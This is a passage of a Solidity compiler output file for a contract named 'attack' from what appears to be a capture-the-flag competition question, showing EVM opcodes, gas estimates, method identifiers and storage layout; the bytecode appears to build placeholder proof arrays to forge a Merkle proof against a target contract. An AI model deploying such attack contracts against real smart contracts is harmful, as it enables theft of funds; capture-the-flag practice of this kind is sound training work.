0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x92F6C439 DUP4 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x23E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x252 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x2 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT DUP1 ISZERO PUSH2 0x275 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x20 MUL PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x2A4 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x20 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH31 0x11223344556677889900112233445566778899001122334455667788990011 PUSH1 0x0 SHL DUP2 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x2D7 JUMPI INVALID JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD DUP2 DUP2 MSTORE POP POP PUSH31 0x11223344556677889900112233445566778899001122334455667788990022 PUSH1 0x0 SHL DUP2 PUSH1 0x1 DUP2 MLOAD DUP2 LT PUSH2 0x313 JUMPI INVALID JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD DUP2 DUP2 MSTORE POP POP PUSH1 0x0 ADDRESS PUSH1 0x40 MLOAD PUSH1 0x20 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x60 SHL DUP2 MSTORE PUSH1 0x14 ADD SWAP2 POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE DUP1 MLOAD SWAP1 PUSH1 0x20 ADD KECCAK256 SWAP1 POP PUSH1 0x0 JUMPDEST DUP3 MLOAD DUP2 LT ISZERO PUSH2 0x404 JUMPI PUSH1 0x0 DUP4 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x37D JUMPI INVALID JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD MLOAD SWAP1 POP DUP1 DUP4 GT PUSH2 0x3C4 JUMPI DUP3 DUP2 PUSH1 0x40 MLOAD PUSH1 0x20 ADD DUP1 DUP4 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP3 POP POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE DUP1 MLOAD SWAP1 PUSH1 0x20 ADD KECCAK256 SWAP3 POP PUSH2 0x3F6 JUMP JUMPDEST DUP1 DUP4 PUSH1 0x40 MLOAD PUSH1 0x20 ADD DUP1 DUP4 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP3 POP POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE DUP1 MLOAD SWAP1 PUSH1 0x20 ADD KECCAK256 SWAP3 POP JUMPDEST POP DUP1 DUP1 PUSH1 0x1 ADD SWAP2 POP POP PUSH2 0x366 JUMP JUMPDEST POP DUP1 SWAP3 POP POP POP SWAP1 JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT DUP1 ISZERO PUSH2 0x46A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x20 MUL PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x499 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x20 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH31 0x11223344556677889900112233445566778899001122334455667788990011 PUSH1 0x0 SHL DUP2 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x4CC JUMPI INVALID JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD DUP2 DUP2 MSTORE POP POP PUSH31 0x11223344556677889900112233445566778899001122334455667788990022 PUSH1 0x0 SHL DUP2 PUSH1 0x1 DUP2 MLOAD DUP2 LT PUSH2 0x508 JUMPI INVALID JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD DUP2 DUP2 MSTORE POP POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x38BE5592 DUP3 ADDRESS PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP5 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH1 0x20 MUL DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x5C0 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x5A5 JUMP JUMPDEST POP POP POP POP SWAP1 POP ADD SWAP4 POP POP POP POP PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x5E6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x5FA JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x610 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 MUL REVERT PUSH11 0x8FD6613DA6642B600D7567 PUSH14 0x4089C5F4DBB48CCA74E9AE0BD70B PUSH17 0xF1D164736F6C6343000706003300000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "325400",
						"executionCost": "362",
						"totalCost": "325762"
					},
					"external": {
						"": "151",
						"att(bytes32)": "infinite",
						"att2()": "infinite",
						"figure()": "infinite",
						"init(address)": "21123"
					}
				},
				"methodIdentifiers": {
					"att(bytes32)": "12c973c1",
					"att2()": "38a39681",
					"figure()": "13b6ae4c",
					"init(address)": "19ab453c"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 296,
						"contract": "赛题-预赛/第三题/attack.sol:attack",
						"label": "merk",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(Merkle)243"
					}
				],
				"types": {
					"t_contract(Merkle)243": {
						"encoding": "inplace",
						"label": "contract Merkle",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}